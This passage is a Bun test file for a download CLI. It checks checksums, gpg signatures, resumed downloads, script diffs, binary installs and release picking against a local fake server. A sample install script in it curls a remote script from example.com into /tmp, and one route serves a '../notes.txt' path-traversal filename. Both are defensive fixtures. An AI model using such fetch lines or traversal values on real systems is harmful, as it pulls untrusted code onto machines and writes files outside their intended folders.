import type { TCPSocketListener } from 'bun'
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, utimesSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'
import process from 'node:process'
import { tempDirs } from '@kaynooo/cli-kit/test'
import { afterAll, beforeAll, describe, expect, test } from 'bun:test'
import { fileName } from '../src/download'
import { pickAsset } from '../src/release'
import { summarize } from '../src/script'
import { pathUnder, sumFor } from '../src/sums'

const CLI = new URL('../src/cli.ts', import.meta.url).pathname
const temp = tempDirs()
const BINARY = new Uint8Array(3000).map((_, index) => index % 251)
const HTML = '<!DOCTYPE html><html><body>sign in</body></html>'
const SCRIPT_V1 = '#!/bin/sh\n# writes a marker\ncurl -fsSL https://example.com/next.sh -o /tmp/next.sh\necho "ran $*" > "$MARK"\n'
const SCRIPT_V2 = '#!/bin/sh\n# writes a marker\necho "ran again $*" > "$MARK"\n'

let script = SCRIPT_V1
let archive: Uint8Array
// /big.bin answers ranges asked with an If-Range matching its ETag, unless `ranges` is off; `cut` makes its next answer break off halfway.
const BIG = new Uint8Array(256 * 1024).map((_, index) => (index * 7) % 253)
const big = { body: BIG, etag: '"v1"', ranges: true, cut: false, asked: [] as string[] }
// /moving.bin answers 304 to an If-None-Match of its current ETag; /moving.sums lists `sums` as its sha.
const moving = { body: 'v1\n', sums: 'v1\n', conditional: 0 }
let sums: string
let server: ReturnType<typeof Bun.serve>
// Answers the whole length of /big.bin and drops the connection halfway, as a network does; Bun.serve would fix the length to what it sends.
let cutter: TCPSocketListener
// Two gpg keys of a keyring of the tests' own, the first exported to a file; the signatures are served beside the files.
const hasGpg = Bun.which('gpg') !== null
// The tests running dl through several gpg checks outlast bun's 5 s default on a busy CI runner.
const GPG_TIMEOUT = 20_000
const gpgHome = temp('dl-gnupg-')
const signatures = new Map<string, string>()
let signer = ''
let stranger = ''
let signerFile = ''

async function gpg(...args: string[]): Promise<string> {
  const child = Bun.spawn(['gpg', '--batch', '--homedir', gpgHome, ...args], { stdin: 'ignore', stdout: 'pipe', stderr: 'ignore' })
  const [out] = await Promise.all([child.stdout.text(), child.exited])

  return out
}

async function newKey(name: string): Promise<string> {
  await gpg('--passphrase', '', '--quick-gen-key', `${name} <${name}@example.com>`, 'ed25519', 'sign', 'never')

  return (await gpg('--with-colons', '--list-keys', `${name}@example.com`)).split('\n').find(line => line.startsWith('fpr:'))!.split(':')[9]!
}

let signed = 0

// A file of its own per signature, as gpg will not write over one already there.
async function sign(fingerprint: string, data: Uint8Array | string): Promise<string> {
  const file = join(gpgHome, `${signed++}.data`)

  writeFileSync(file, data)
  await gpg('--local-user', fingerprint, '--armor', '--detach-sign', '-o', `${file}.asc`, file)

  return readFileSync(`${file}.asc`, 'utf8')
}

function sha256(data: Uint8Array | string): string {
  return new Bun.CryptoHasher('sha256').update(data).digest('hex')
}

// The releases /gh (GitHub's API) and /fj (Forgejo's) answer for o/tool, each asset served under /rel/<tag>/<name>; `digest` gives the sha256 as GitHub does.
interface FakeRelease { tag: string, published: string, prerelease?: boolean, digest?: boolean, assets: Record<string, string> }

const ARCH = process.arch === 'arm64' ? 'aarch64' : 'x86_64'
const OTHER_ARCH = ARCH === 'x86_64' ? 'aarch64' : 'x86_64'
const DAY = 24 * 3600_000
let releases: FakeRelease[] = []

function ago(days: number): string {
  return new Date(Date.now() - days * DAY).toISOString()
}

function tagged(tag: string): Response {
  const release = releases.find(each => each.tag === tag)

  return release === undefined ? new Response('not found', { status: 404 }) : Response.json(apiRelease(release))
}

// A build per platform of `tag` and a checksums file listing them.
function builds(tag: string, extra: Record<string, string> = {}): Record<string, string> {
  const files = { [`tool-${tag}-linux-${ARCH}`]: `#!/bin/sh\necho ${tag}\n`, [`tool-${tag}-linux-${OTHER_ARCH}`]: 'other arch\n', [`tool-${tag}-darwin-universal`]: 'mac\n', ...extra }

  return { ...files, 'checksums.txt': Object.entries(files).map(([name, content]) => `${sha256(content)}  ${name}\n`).join('') }
}

function apiRelease(release: FakeRelease): object {
  return {
    tag_name: release.tag,
    draft: false,
    prerelease: release.prerelease ?? false,
    published_at: release.published,
    assets: Object.entries(release.assets).map(([name, content]) => ({ name, browser_download_url: url(`/rel/${release.tag}/${name}`), ...release.digest === true ? { digest: `sha256:${sha256(content)}` } : {} })),
  }
}

beforeAll(async () => {
  const source = temp('dl-archive-')

  mkdirSync(join(source, 'tool-1.0'))
  writeFileSync(join(source, 'tool-1.0', 'tool'), '#!/bin/sh\necho tool\n', { mode: 0o755 })
  writeFileSync(join(source, 'tool-1.0', 'README'), 'read me\n')
  await Bun.spawn(['tar', 'czf', join(source, 'tool.tar.gz'), '-C', source, 'tool-1.0']).exited
  archive = await Bun.file(join(source, 'tool.tar.gz')).bytes()
  sums = `${sha256(BINARY)}  tool.bin\n${sha256(archive)} *tool.tar.gz\n${'0'.repeat(64)}  bad.bin\n`

  if (hasGpg) {
    signer = await newKey('signer')
    stranger = await newKey('stranger')
    signerFile = join(gpgHome, 'signer.asc')
    writeFileSync(signerFile, await gpg('--armor', '--export', signer))
    signatures.set('/tool.bin.asc', await sign(signer, BINARY))
    signatures.set('/tool.bin.stranger.asc', await sign(stranger, BINARY))
    signatures.set('/SHA256SUMS.asc', await sign(signer, sums))
  }

  cutter = Bun.listen({
    hostname: '127.0.0.1',
    port: 0,
    socket: {
      data(socket) {
        socket.write(`HTTP/1.1 200 OK\r\nContent-Length: ${big.body.length}\r\nETag: ${big.etag}\r\nContent-Type: application/octet-stream\r\n\r\n`)
        socket.write(big.body.subarray(0, big.body.length / 2))
        socket.flush()
        setTimeout(() => socket.end(), 20)
      },
    },
  })
  server = Bun.serve({
    port: 0,
    routes: {
      '/tool.bin': () => new Response(BINARY, { headers: { 'content-type': 'application/octet-stream' } }),
      '/bad.bin': () => new Response(BINARY),
      '/tool.tar.gz': () => new Response(archive, { headers: { 'content-type': 'application/gzip' } }),
      '/SHA256SUMS': () => new Response(sums),
      '/moving.bin': (request) => {
        const etag = `"${sha256(moving.body).slice(0, 16)}"`

        if (request.headers.get('if-none-match') === etag) {
          moving.conditional++

          return new Response(null, { status: 304, headers: { etag } })
        }

        return new Response(moving.body, { headers: { etag, 'content-type': 'application/octet-stream' } })
      },
      '/moving.sums': () => new Response(`${sha256(moving.sums)}  moving.bin\n`),
      '/big.bin': (request) => {
        const range = request.headers.get('range')
        const start = Number((/^bytes=(\d+)-$/).exec(range ?? '')?.[1] ?? 0)
        const partial = big.ranges && range !== null && request.headers.get('if-range') === big.etag
        const body = partial ? big.body.subarray(start) : big.body
        const init = { status: partial ? 206 : 200, headers: { 'etag': big.etag, 'content-type': 'application/octet-stream', ...partial ? { 'content-range': `bytes ${start}-${big.body.length - 1}/${big.body.length}` } : {} } }

        if (range !== null)
          big.asked.push(range)

        if (!big.cut)
          return new Response(body, init)

        big.cut = false

        return Response.redirect(`http://127.0.0.1:${cutter.port}/big.bin`, 302)
      },
      '/sig/*': request => new Response(signatures.get(new URL(request.url).pathname.slice('/sig'.length)) ?? 'none', { status: signatures.has(new URL(request.url).pathname.slice('/sig'.length)) ? 200 : 404 }),
      '/install.sh': () => new Response(script, { headers: { 'content-type': 'text/plain' } }),
      '/page': () => new Response(HTML, { headers: { 'content-type': 'text/html' } }),
      '/fake.zip': () => new Response(HTML, { headers: { 'content-type': 'text/html' } }),
      '/named': () => new Response('hello\n', { headers: { 'content-disposition': 'attachment; filename="../notes.txt"' } }),
      '/moved': () => Response.redirect('/install.sh', 302),
      '/missing': () => new Response('gone', { status: 404 }),
      '/encoded.tar.gz': () => new Response(archive, { headers: { 'content-type': 'application/gzip', 'content-encoding': 'gzip' } }),
      '/gh/repos/o/tool/releases': () => Response.json(releases.map(apiRelease)),
      '/gh/repos/o/tool/releases/tags/:tag': request => tagged(request.params.tag),
      '/fj/api/v1/repos/o/tool/releases': () => Response.json(releases.map(apiRelease)),
      '/fj/api/v1/repos/o/tool/releases/tags/:tag': request => tagged(request.params.tag),
      '/rel/:tag/:name': (request) => {
        const content = releases.find(each => each.tag === request.params.tag)?.assets[request.params.name]

        return content === undefined ? new Response('not found', { status: 404 }) : new Response(content, { headers: { 'content-type': 'application/octet-stream' } })
      },
    },
  })
})

afterAll(async () => {
  await server.stop(true)
  cutter.stop(true)

  if (hasGpg)
    await Bun.spawn(['gpgconf', '--homedir', gpgHome, '--kill', 'all']).exited
})

interface Ran { code: number, out: string, err: string }

// Spawned, not run in-process, and awaited, so the server in this process answers meanwhile; in agent mode, tables come tab-separated.
async function dl(args: string[], home: string, env: Record<string, string> = {}): Promise<Ran> {
  const child = Bun.spawn([process.execPath, CLI, ...args], {
    stdin: 'ignore',
    stdout: 'pipe',
    stderr: 'pipe',
    env: { ...process.env, NO_COLOR: '1', KIT_MODE: 'agent', HOME: home, XDG_STATE_HOME: join(home, 'state'), TMPDIR: join(home, 'tmp'), MARK: join(home, 'mark'), ...env },
  })
  const [out, err, code] = await Promise.all([child.stdout.text(), child.stderr.text(), child.exited])

  return { code, out, err }
}

function home(): string {
  const dir = temp('dl-home-')

  mkdirSync(join(dir, 'tmp'))

  return dir
}

function url(path: string): string {
  return new URL(path, server.url).href
}

function pathOf(out: string): string {
  return (/^path\s+(\S+)$/m).exec(out)![1]!
}

describe('downloading', () => {
  test('lands in a new folder of its own and prints path, size, type and sha256', async () => {
    const dir = home()
    const { code, out } = await dl([url('/tool.bin')], dir)
    const path = pathOf(out)

    expect(code).toBe(0)
    expect(path.startsWith(join(dir, 'tmp', 'dl-'))).toBe(true)
    expect(readFileSync(path)).toEqual(Buffer.from(BINARY))
    expect(out).toContain(`sha256\t${sha256(BINARY)}\n`)
    expect(out).toContain('type\tapplication/octet-stream')
    expect(out).toContain('seen\tfirst download')
  })

  test('-o puts it in the folder named and refuses to overwrite what is there', async () => {
    const dir = home()
    const target = join(dir, 'downloads')

    expect((await dl([url('/tool.bin'), '-o', target], dir)).code).toBe(0)
    expect(existsSync(join(target, 'tool.bin'))).toBe(true)

    const again = await dl([url('/tool.bin'), '-o', target], dir)

    expect(again.code).toBe(1)
    expect(again.err).toContain('already exists')
  })

  test('names the file from Content-Disposition, kept to a plain name, and shows the URL redirects ended on', async () => {
    const dir = home()
    const named = await dl([url('/named')], dir)
    const moved = await dl([url('/moved')], dir)

    expect(pathOf(named.out).endsWith('/notes.txt')).toBe(true)
    expect(moved.out).toContain(`url\t${url('/install.sh')}`)
    expect(pathOf(moved.out).endsWith('/install.sh')).toBe(true)
  })

  test('an error status or a download over --max-size fails and leaves nothing behind', async () => {
    const dir = home()
    const missing = await dl([url('/missing')], dir)
    const big = await dl([url('/tool.bin'), '--max-size', '1K'], dir)

    expect(missing.code).toBe(1)
    expect(missing.err).toContain('answered 404')
    expect(big.code).toBe(1)
    expect(big.err).toContain('over --max-size 1.0K')
    expect(readdirSync(join(dir, 'tmp'))).toEqual([])
  })

  test('an HTML page fails where a file was expected, and is kept where a page could be meant', async () => {
    const dir = home()
    const fake = await dl([url('/fake.zip')], dir)

    expect(fake.code).toBe(1)
    expect(fake.err).toContain('answered an HTML page, not a file')
    expect((await dl([url('/page'), '--exec'], dir)).code).toBe(1)
    expect((await dl([url('/page')], dir)).code).toBe(0)
  })

  test('usage errors exit 2', async () => {
    const dir = home()

    expect((await dl(['ftp://example.com/x'], dir)).code).toBe(2)
    expect((await dl([url('/tool.bin'), '--sha256', 'abc'], dir)).code).toBe(2)
    expect((await dl([url('/tool.bin'), '--yes'], dir)).code).toBe(2)
    expect((await dl([url('/tool.bin'), '--', 'arg'], dir)).code).toBe(2)
  })
})

describe('checking', () => {
  test('--sha256 and --sums accept the right file', async () => {
    const dir = home()
    const pinned = await dl([url('/tool.bin'), '--sha256', sha256(BINARY).toUpperCase()], dir)
    const summed = await dl([url('/tool.bin'), '--sums', url('/SHA256SUMS')], dir)

    expect(pinned.code).toBe(0)
    expect(pinned.out).toContain(`${sha256(BINARY)} verified`)
    expect(summed.code).toBe(0)
    expect(summed.out).toContain('verified')
  })

  test('a mismatch deletes the file and the folder made for it', async () => {
    const dir = home()
    const pinned = await dl([url('/tool.bin'), '--sha256', '1'.repeat(64)], dir)
    const summed = await dl([url('/bad.bin'), '--sums', url('/SHA256SUMS')], dir)
    const unlisted = await dl([url('/named'), '--sums', url('/SHA256SUMS')], dir)

    expect(pinned.code).toBe(1)
    expect(pinned.err).toContain('sha256 mismatch for tool.bin')
    expect(summed.code).toBe(1)
    expect(unlisted.code).toBe(1)
    expect(unlisted.err).toContain('holds no sha256 for notes.txt')
    expect(readdirSync(join(dir, 'tmp'))).toEqual([])
  })

  test.skipIf(!hasGpg)('--sig checks a gpg signature of the file, or of the checksums file, with a key file or a fingerprint of the keyring', async () => {
    const dir = home()
    const byFile = await dl([url('/tool.bin'), '--sig', url('/sig/tool.bin.asc'), '--key', signerFile], dir)
    const byFingerprint = await dl([url('/tool.bin'), '--sig', url('/sig/tool.bin.asc'), '--key', signer.match(/.{4}/g)!.join(' ')], dir, { GNUPGHOME: gpgHome })
    const bySums = await dl([url('/tool.bin'), '--sums', url('/SHA256SUMS'), '--sig', url('/sig/SHA256SUMS.asc'), '--key', signerFile], dir)

    expect(byFile).toMatchObject({ code: 0, out: expect.stringContaining(`signature\tgpg, by ${signer}, verified`) })
    expect(byFingerprint).toMatchObject({ code: 0, out: expect.stringContaining(`gpg, by ${signer}`) })
    expect(bySums.code).toBe(0)
    expect(bySums.out).toContain(`${sha256(BINARY)} verified`)
    expect(bySums.out).toContain(`gpg, by ${signer}`)
  }, GPG_TIMEOUT)

  test.skipIf(!hasGpg)('a signature by another key, or over other bytes, deletes the file', async () => {
    const dir = home()
    const otherKey = await dl([url('/tool.bin'), '--sig', url('/sig/tool.bin.stranger.asc'), '--key', signer], dir, { GNUPGHOME: gpgHome })
    const notInFile = await dl([url('/tool.bin'), '--sig', url('/sig/tool.bin.stranger.asc'), '--key', signerFile], dir)
    const otherBytes = await dl([url('/tool.tar.gz'), '--sig', url('/sig/tool.bin.asc'), '--key', signerFile], dir)

    expect(otherKey).toMatchObject({ code: 1, err: expect.stringContaining(`the gpg signature is by ${stranger}, not ${signer}`) })
    expect(notInFile).toMatchObject({ code: 1, err: expect.stringContaining('the gpg signature does not verify') })
    expect(otherBytes).toMatchObject({ code: 1, err: expect.stringContaining('the gpg signature does not verify') })
    expect(readdirSync(join(dir, 'tmp'))).toEqual([])
  }, GPG_TIMEOUT)

  test('--sig and --key go together, and a key whose tool is missing is refused before the download', async () => {
    const dir = home()
    const pem = join(dir, 'cosign.pub')
    const empty = temp('dl-path-')

    writeFileSync(pem, '-----BEGIN PUBLIC KEY-----\nMFkw\n-----END PUBLIC KEY-----\n')

    expect((await dl([url('/tool.bin'), '--sig', url('/sig/tool.bin.asc')], dir)).code).toBe(2)
    expect((await dl([url('/tool.bin'), '--key', pem], dir)).code).toBe(2)
    expect((await dl([url('/tool.bin'), '--sig', url('/sig/tool.bin.asc'), '--key', 'nonsense'], dir)).code).toBe(2)
    expect((await dl([url('/tool.bin'), '--sig', url('/sig/tool.bin.asc'), '--key', dir], dir)).code).toBe(2)
    expect(await dl([url('/tool.bin'), '--sig', url('/sig/x.minisig'), '--key', `RW${'A'.repeat(54)}`], dir, { PATH: empty })).toMatchObject({ code: 1, err: expect.stringContaining('--key is a minisign key and minisign is not on PATH') })
    expect(await dl([url('/tool.bin'), '--sig', url('/sig/x.sig'), '--key', pem], dir, { PATH: empty })).toMatchObject({ code: 1, err: expect.stringContaining('--key is a cosign key and cosign is not on PATH') })
    expect(readdirSync(join(dir, 'tmp'))).toEqual([])
  })

  test('sumFor reads GNU, binary-mode, BSD and lone-hash files', () => {
    const hash = 'a'.repeat(64)

    expect(sumFor(`${'b'.repeat(64)}  other\n${hash}  ./dist/tool\n`, 'tool')).toBe(hash)
    expect(sumFor(`${hash.toUpperCase()} *tool`, 'tool')).toBe(hash)
    expect(sumFor(`SHA256 (tool) = ${hash}`, 'tool')).toBe(hash)
    expect(sumFor(`${hash}\n`, 'tool')).toBe(hash)
    expect(sumFor(`${hash}  other`, 'tool')).toBeUndefined()
  })

  test('sumFor takes the line at the download\'s path, and refuses to guess between two of the same name', () => {
    const [one, two] = ['1'.repeat(64), '2'.repeat(64)]
    const sums = `${one}  linux/foo\n${two}  ./mac/foo\n`

    expect(sumFor(sums, 'foo', 'mac/foo')).toBe(two)
    expect(sumFor(sums, 'foo', 'linux/foo')).toBe(one)
    expect(() => sumFor(sums, 'foo')).toThrow('linux/foo, ./mac/foo')
    expect(sumFor(`${one}  a/foo\n${one}  b/foo\n`, 'foo')).toBe(one)
    expect(pathUnder('https://x.org/v1/SHA256SUMS', 'https://x.org/v1/mac/foo')).toBe('mac/foo')
    expect(pathUnder('https://x.org/v1/SHA256SUMS', 'https://y.org/v1/mac/foo')).toBeUndefined()
    expect(pathUnder('https://x.org/v1/SHA256SUMS', 'https://x.org/v1/a%zz')).toBe('a%zz')
  })
})

describe('resuming', () => {
  function reset(ranges = true): void {
    Object.assign(big, { body: BIG, etag: '"v1"', ranges, cut: true, asked: [] })
  }

  async function parts(dir: string): Promise<string[]> {
    return Array.fromAsync(new Bun.Glob('**/part*').scan({ cwd: join(dir, 'state'), dot: true }))
  }

  test('a download that broke off is resumed by the next one with a Range request, the sha covering the whole file', async () => {
    const dir = home()

    reset()

    const broken = await dl([url('/big.bin')], dir)

    expect(broken.code).toBe(1)
    expect(broken.err).toContain('broke off')
    expect(broken.err).toContain('run the same dl again to resume it')
    expect((await parts(dir)).length).toBe(2)

    const resumed = await dl([url('/big.bin'), '--sha256', sha256(BIG)], dir)

    expect(resumed.code).toBe(0)
    expect(resumed.out).toContain(`${sha256(BIG)} verified`)
    expect(big.asked).toHaveLength(1)
    expect(big.asked[0]).not.toBe('bytes=0-')
    expect(await parts(dir)).toEqual([])
  })

  test('a file changed since, or a server without ranges, starts over from zero', async () => {
    const changed = home()
    const v2 = BIG.map(byte => 255 - byte)

    reset()
    expect((await dl([url('/big.bin')], changed)).code).toBe(1)
    Object.assign(big, { body: v2, etag: '"v2"' })
    expect((await dl([url('/big.bin'), '--sha256', sha256(v2)], changed)).code).toBe(0)

    const rangeless = home()

    reset(false)
    expect((await dl([url('/big.bin')], rangeless)).code).toBe(1)
    expect((await dl([url('/big.bin'), '--sha256', sha256(BIG)], rangeless)).code).toBe(0)
    expect(big.asked).toHaveLength(1)
  })

  test('a part left over a week is dropped by the next download of any URL', async () => {
    const dir = home()

    reset()
    expect((await dl([url('/big.bin')], dir)).code).toBe(1)

    const [part] = (await parts(dir)).filter(each => each.endsWith('part'))
    const weekAgo = new Date(Date.now() - 8 * 24 * 3600_000)

    utimesSync(join(dir, 'state', part!), weekAgo, weekAgo)
    expect((await dl([url('/tool.bin')], dir)).code).toBe(0)
    expect(await parts(dir)).toEqual([])
  })

  // The part lives in the state folder, so one on another filesystem than the download's is copied over rather than renamed.
  test.skipIf(!existsSync('/dev/shm') || statSync('/dev/shm').dev === statSync(temp('dl-dev-')).dev)('a part on another filesystem than the folder is copied into place', async () => {
    const dir = home()
    const state = mkdtempSync('/dev/shm/dl-state-')

    try {
      reset()
      expect((await dl([url('/big.bin')], dir, { XDG_STATE_HOME: state })).code).toBe(1)

      const out = join(dir, 'out')
      const resumed = await dl([url('/big.bin'), '-o', out, '--sha256', sha256(BIG)], dir, { XDG_STATE_HOME: state })

      expect(resumed.code).toBe(0)
      expect(readFileSync(join(out, 'big.bin'))).toEqual(Buffer.from(BIG))
      expect(Array.from(new Bun.Glob('**/part*').scanSync({ cwd: state, dot: true }))).toEqual([])
    }
    finally {
      rmSync(state, { recursive: true, force: true })
    }
  })
})

describe('remembering', () => {
  test('a script downloaded again says it is the same, or shows its diff once changed', async () => {
    const dir = home()

    script = SCRIPT_V1
    await dl([url('/install.sh')], dir)

    const same = await dl([url('/install.sh')], dir)

    script = SCRIPT_V2

    const changed = await dl([url('/install.sh')], dir)

    script = SCRIPT_V1
    expect(same.out).toContain('seen\tsame as the download of just now')
    expect(changed.out).toContain(`seen\tchanged since the download of just now, was ${sha256(SCRIPT_V1).slice(0, 12)}`)
    expect(changed.out).toContain('--- last\n+++ install.sh\n@@ -1,4 +1,3 @@')
    expect(changed.out).toContain('+echo "ran again $*" > "$MARK"')
    expect(changed.out).toContain('-curl -fsSL https://example.com/next.sh -o /tmp/next.sh')
  })
})

describe('encoded bodies', () => {
  test('keeps a body sent with Content-Encoding: gzip as the bytes it is', async () => {
    const { code, out } = await dl([url('/encoded.tar.gz'), '-x'], home())

    expect(code).toBe(0)
    expect(out).toContain(`sha256\t${sha256(archive)}`)
    expect(readFileSync(pathOf(out)).length).toBe(archive.length)
  })
})

describe('extracting and installing', () => {
  test('-x unpacks into a new folder beside the archive', async () => {
    const dir = home()
    const { code, out } = await dl([url('/tool.tar.gz'), '-x'], dir)
    const folder = (/^extracted\s+(\S+)$/m).exec(out)![1]!

    expect(code).toBe(0)
    expect(folder.endsWith('/tool')).toBe(true)
    expect(readFileSync(join(folder, 'tool-1.0', 'README'), 'utf8')).toBe('read me\n')
  })

  test('--bin installs the one executable of an archive, refuses to replace it without --force, and records it', async () => {
    const dir = home()
    const first = await dl([url('/tool.tar.gz'), '--bin', '--sums', url('/SHA256SUMS')], dir)
    const target = join(dir, '.local', 'bin', 'tool')

    expect(first.code).toBe(0)
    expect(first.out).toContain(`installed\t${target}`)
    expect(statSync(target).mode & 0o777).toBe(0o755)

    const again = await dl([url('/tool.tar.gz'), '--bin'], dir)

    expect(again.code).toBe(1)
    expect(again.err).toContain('pass --force to replace it')
    expect((await dl([url('/tool.tar.gz'), '--bin', '--force'], dir)).code).toBe(0)

    const listed = await dl(['ls'], dir)

    expect(listed.out).toContain(`tool\tbin\tjust now\t${sha256(archive).slice(0, 12)}\t${url('/tool.tar.gz')}`)
  })

  test('--bin installs a plain file under the name given, and fails on a name the archive lacks', async () => {
    const dir = home()

    expect((await dl([url('/tool.bin'), '--bin', 'mytool'], dir)).code).toBe(0)
    expect(existsSync(join(dir, '.local', 'bin', 'mytool'))).toBe(true)

    const wrong = await dl([url('/tool.tar.gz'), '--bin', 'other'], dir)

    expect(wrong.code).toBe(1)
    expect(wrong.err).toContain('no executable named other: tool-1.0/tool')
  })
})

describe('outdated and update', () => {
  test('outdated asks each source with its ETag, and update installs what changed, checked by the same --sums', async () => {
    const dir = home()
    const installed = join(dir, '.local', 'bin', 'mover')

    Object.assign(moving, { body: 'v1\n', sums: 'v1\n', conditional: 0 })
    expect((await dl([url('/moving.bin'), '--bin', 'mover', '--sums', url('/moving.sums')], dir)).code).toBe(0)
    expect(await dl(['outdated'], dir)).toMatchObject({ code: 0, out: 'all 1 current\n' })
    expect(moving.conditional).toBe(1)

    Object.assign(moving, { body: 'v2\n', sums: 'v2\n' })

    const behind = await dl(['outdated'], dir)

    expect(behind.code).toBe(1)
    expect(behind.out).toContain(`mover\tbin\tjust now\tchanged, ${sha256('v1\n').slice(0, 12)} now ${sha256('v2\n').slice(0, 12)}`)
    expect(behind.out).toContain('update them: dl update mover')
    expect(JSON.parse((await dl(['outdated', '--json'], dir)).out)).toMatchObject([{ name: 'mover', kind: 'bin', state: 'changed', now: sha256('v2\n') }])

    expect((await dl(['update'], dir)).code).toBe(0)
    expect(readFileSync(installed, 'utf8')).toBe('v2\n')
    expect((await dl(['outdated', 'mover'], dir)).code).toBe(0)

    moving.body = 'v3\n'

    const refused = await dl(['update', 'mover'], dir)

    expect(refused.code).toBe(1)
    expect(refused.err).toContain('mover: sha256 mismatch for moving.bin')
    expect(readFileSync(installed, 'utf8')).toBe('v2\n')
    expect((await dl(['update', 'nothing'], dir)).code).toBe(2)
  })

  test.skipIf(!hasGpg)('update checks a changed file against the signature and key it was installed with', async () => {
    const dir = home()
    const installed = join(dir, '.local', 'bin', 'signed')

    Object.assign(moving, { body: 'v1\n', sums: 'v1\n' })
    signatures.set('/moving.bin.asc', await sign(signer, 'v1\n'))
    expect((await dl([url('/moving.bin'), '--bin', 'signed', '--sig', url('/sig/moving.bin.asc'), '--key', signerFile], dir)).code).toBe(0)

    moving.body = 'v2\n'
    signatures.set('/moving.bin.asc', await sign(stranger, 'v2\n'))

    const refused = await dl(['update', 'signed'], dir)

    expect(refused.code).toBe(1)
    expect(refused.err).toContain('signed: the gpg signature does not verify')
    expect(readFileSync(installed, 'utf8')).toBe('v1\n')

    signatures.set('/moving.bin.asc', await sign(signer, 'v2\n'))
    expect((await dl(['update', 'signed'], dir)).code).toBe(0)
    expect(readFileSync(installed, 'utf8')).toBe('v2\n')
  }, GPG_TIMEOUT)

  test('update shows a changed script and runs it with its arguments, unpinned only with --yes', async () => {
    const dir = home()

    script = SCRIPT_V1
    expect((await dl([url('/install.sh'), '--exec', '--sha256', sha256(SCRIPT_V1), '--', 'a', 'b'], dir)).code).toBe(0)
    script = SCRIPT_V2

    const unpinned = await dl(['update'], dir)

    expect(unpinned.code).toBe(1)
    expect(unpinned.out).toContain('+echo "ran again $*" > "$MARK"')
    expect(unpinned.err).toContain('not run: no --sha256, --sums or --sig pins this script')
    expect(readFileSync(join(dir, 'mark'), 'utf8')).toBe('ran a b\n')

    expect((await dl(['update', '--yes'], dir)).code).toBe(0)
    script = SCRIPT_V1
    expect(readFileSync(join(dir, 'mark'), 'utf8')).toBe('ran again a b\n')
  })
})

describe('releases', () => {
  const forges = (): Record<string, string> => ({ DL_GITHUB_API: url('/gh'), DL_FORGEJO_URL: url('/fj') })
  const installed = (dir: string, name: string) => readFileSync(join(dir, '.local', 'bin', name), 'utf8')

  test('gh:owner/repo installs this machine\'s build of the newest release two weeks old, checked against its checksums', async () => {
    const dir = home()

    releases = [{ tag: 'v2.0.0-rc', published: ago(1), prerelease: true, assets: builds('v2.0.0-rc') }, { tag: 'v1.2.0', published: ago(3), assets: builds('v1.2.0') }, { tag: 'v1.1.0', published: ago(30), assets: builds('v1.1.0') }]

    const taken = await dl(['gh:o/tool', '--bin', 'tool'], dir, forges())

    expect(taken.code).toBe(0)
    expect(taken.out).toContain(`release\tgh:o/tool v1.1.0, published 30d ago, tool-v1.1.0-linux-${ARCH}`)
    expect(taken.out).toContain(`${sha256('#!/bin/sh\necho v1.1.0\n')} verified`)
    expect(taken.err).toContain('took v1.1.0, skipped v1.2.0 (3d ago) as under two weeks old')
    expect(installed(dir, 'tool')).toBe('#!/bin/sh\necho v1.1.0\n')

    expect((await dl(['gh:o/tool', '--bin', 'tool', '--force', '--fresh'], dir, forges())).code).toBe(0)
    expect(installed(dir, 'tool')).toBe('#!/bin/sh\necho v1.2.0\n')

    const tagged = await dl(['fj:o/tool@v1.2.0', '--bin', 'other'], dir, forges())

    expect(tagged.code).toBe(0)
    expect(tagged.err).not.toContain('skipped')
    expect(installed(dir, 'other')).toBe('#!/bin/sh\necho v1.2.0\n')
  })

  test.skipIf(!hasGpg)('--key alone checks the signature the release ships beside its checksums file', async () => {
    const dir = home()
    const assets = builds('v1.0.0')

    releases = [{ tag: 'v1.0.0', published: ago(20), assets }]
    expect(await dl(['gh:o/tool', '--key', signerFile], dir, forges())).toMatchObject({ code: 1, err: expect.stringContaining('gh:o/tool v1.0.0 ships no gpg signature of checksums.txt') })

    assets['checksums.txt.asc'] = await sign(signer, assets['checksums.txt']!)

    const signed = await dl(['gh:o/tool', '--key', signerFile], dir, forges())

    expect(signed.code).toBe(0)
    expect(signed.out).toContain(`signature\tgpg, by ${signer}, verified`)
  })

  test('without a checksums file the sha256 the forge gives checks the asset', async () => {
    const assets = builds('v1.0.0')

    delete assets['checksums.txt']
    releases = [{ tag: 'v1.0.0', published: ago(20), digest: true, assets }]

    const taken = await dl(['gh:o/tool'], home(), forges())

    expect(taken.code).toBe(0)
    expect(taken.out).toContain(`${sha256('#!/bin/sh\necho v1.0.0\n')} verified`)
  })

  test('the forge\'s sha256 checks an asset its checksums file leaves out, and a release with neither installs with a warning', async () => {
    const assets = builds('v1.0.0')

    assets['checksums.txt'] = `${sha256('other arch\n')}  tool-v1.0.0-linux-${OTHER_ARCH}\n`
    releases = [{ tag: 'v1.0.0', published: ago(20), digest: true, assets }]

    const digested = await dl(['gh:o/tool'], home(), forges())

    expect(digested.code).toBe(0)
    expect(digested.out).toContain(`${sha256('#!/bin/sh\necho v1.0.0\n')} verified`)

    delete assets['checksums.txt']
    releases = [{ tag: 'v1.0.0', published: ago(20), assets }]

    const unchecked = await dl(['fj:o/tool'], home(), forges())

    expect(unchecked.code).toBe(0)
    expect(unchecked.err).toContain(`fj:o/tool v1.0.0 ships no checksums file and its forge gives no sha256 of tool-v1.0.0-linux-${ARCH}, so nothing checked it`)
  })

  test('--asset takes a script the build filter leaves out, and --key with a pin of the user\'s needs --sig', async () => {
    releases = [{ tag: 'v1.0.0', published: ago(20), assets: builds('v1.0.0', { 'install.sh': 'echo hi\n' }) }]

    const script = await dl(['gh:o/tool', '--asset', 'install.sh'], home(), forges())

    expect(script.code).toBe(0)
    expect(script.out).toContain('install.sh')
    expect(await dl(['gh:o/tool', '--sha256', '0'.repeat(64), '--key', 'A'.repeat(40)], home(), forges())).toMatchObject({ code: 2, err: expect.stringContaining('--key alone checks the release\'s own checksums file') })
  })

  test('a mismatched checksum, a tie between builds or no release two weeks old fails; --asset breaks the tie', async () => {
    const dir = home()
    const tampered = builds('v1.0.0')

    tampered[`tool-v1.0.0-linux-${ARCH}`] = 'tampered\n'
    releases = [{ tag: 'v1.0.0', published: ago(20), assets: tampered }]
    expect(await dl(['gh:o/tool'], dir, forges())).toMatchObject({ code: 1, err: expect.stringContaining('sha256 mismatch') })

    releases = [{ tag: 'v1.0.0', published: ago(20), assets: builds('v1.0.0', { [`tool-v1.0.0-linux-${ARCH}-debug`]: 'debug\n' }) }]

